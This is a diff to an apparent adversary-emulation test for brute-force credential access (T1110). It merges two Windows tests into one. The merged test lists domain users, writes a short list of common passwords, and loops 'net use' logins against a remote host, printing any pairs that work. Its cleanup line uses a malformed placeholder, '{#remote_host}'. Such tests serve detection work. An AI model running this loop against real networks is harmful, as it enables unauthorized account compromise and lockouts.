@@ -3,28 +3,9 @@ attack_technique: T1110
 display_name: Brute Force Credential Access
 
 atomic_tests:
-- name: Create User/Pass files
+- name: Brute Force Credentials
   description: |
-    Creates username and password files
-  supported_platforms:
-    - windows
-  executor: command_prompt
-  input_arguments:
-    input_file_users:
-      type: Path
-      default: DomainUsers.txt
-    input_file_passwords:
-      type: Path
-      default: passwords.txt
-  command: |
-    net user /domain > #{input_file_users}
-    echo "Password1" >> #{input_file_passwords}
-    echo "1q2w3e4r" >> #{input_file_passwords}
-    echo "Password!" >> #{input_file_passwords}
-
-- name: Brute Force Accounts
-  description: |
-    Brutes Forces Accounts on Remote Host
+    Creates username and password files then attempts to brute force on remote host
   supported_platforms:
     - windows
   executor: command_prompt
@@ -42,4 +23,8 @@ atomic_tests:
       type: String
       default: COMPANY
   command: |
+    net user /domain > #{input_file_users}
+    echo "Password1" >> #{input_file_passwords}
+    echo "1q2w3e4r" >> #{input_file_passwords}
+    echo "Password!" >> #{input_file_passwords}
     @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete {#remote_host} > NUL
